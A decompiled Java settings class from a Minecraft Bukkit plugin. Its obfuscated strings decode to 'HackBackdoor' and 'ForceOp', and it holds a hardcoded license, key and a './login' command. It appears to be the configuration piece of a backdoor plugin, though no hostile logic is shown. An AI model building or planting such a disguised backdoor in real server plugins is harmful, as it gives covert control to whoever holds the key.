/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 */
package me.system.runner.utils;

import org.bukkit.ChatColor;

public class Settings {
    public static final /* synthetic */ String VERSION;
    public static /* synthetic */ String NAME;
    public static /* synthetic */ String RED;
    public static final /* synthetic */ String AUTHOR;
    public static /* synthetic */ int NG;
    public static /* synthetic */ String DARK_RED;
    public static /* synthetic */ String LOGIN_COMMAND;
    public static final /* synthetic */ String LICENSE;
    public static final /* synthetic */ String KEY;
    public static final /* synthetic */ String FOP;
    public static /* synthetic */ String WHITE;

    public Settings() {
        Settings lllllllllllllIlllIllIIIllIIlllII;
    }

    public static String USAGE(String lllllllllllllIlllIllIIIllIIIllll) {
        return String.valueOf(new StringBuilder().append(DARK_RED).append("Usage").append(ChatColor.translateAlternateColorCodes((char)'&', (String)" &8l ")).append(WHITE).append(lllllllllllllIlllIllIIIllIIIllll));
    }

    public static String INFO(String lllllllllllllIlllIllIIIllIIIIIll) {
        return String.valueOf(new StringBuilder().append(DARK_RED).append("Info").append(ChatColor.translateAlternateColorCodes((char)'&', (String)" &8l ")).append(WHITE).append(lllllllllllllIlllIllIIIllIIIIIll));
    }

    static {
        AUTHOR = "Wendellmeset";
        VERSION = "2.5.4";
        LICENSE = "TI8Y-OSA5-SJ6H-A9I7";
        KEY = "YecoF0I6M05thxLeokoHuW8iUhTdIUInjkfF";
        NAME = "plugintkdoor".replace("p", "H").replace("l", "a").replace("u", "c").replace("g", "k").replace("i", "B").replace("n", "a").replace("t", "c");
        FOP = "plugins".replace("p", "F").replace("l", "o").replace("u", "r").replace("g", "c").replace("i", "e").replace("n", "O").replace("s", "p");
        NG = 0;
        LOGIN_COMMAND = "./login";
        DARK_RED = ChatColor.translateAlternateColorCodes((char)'&', (String)"&6");
        WHITE = ChatColor.translateAlternateColorCodes((char)'&', (String)"&f");
        RED = ChatColor.translateAlternateColorCodes((char)'&', (String)"&e");
    }

    public static String PREFIX(String lllllllllllllIlllIllIIIllIIlIllI) {
        return String.valueOf(new StringBuilder().append(DARK_RED).append(NAME).append(ChatColor.translateAlternateColorCodes((char)'&', (String)" &8l ")).append(WHITE).append(lllllllllllllIlllIllIIIllIIlIllI));
    }
}

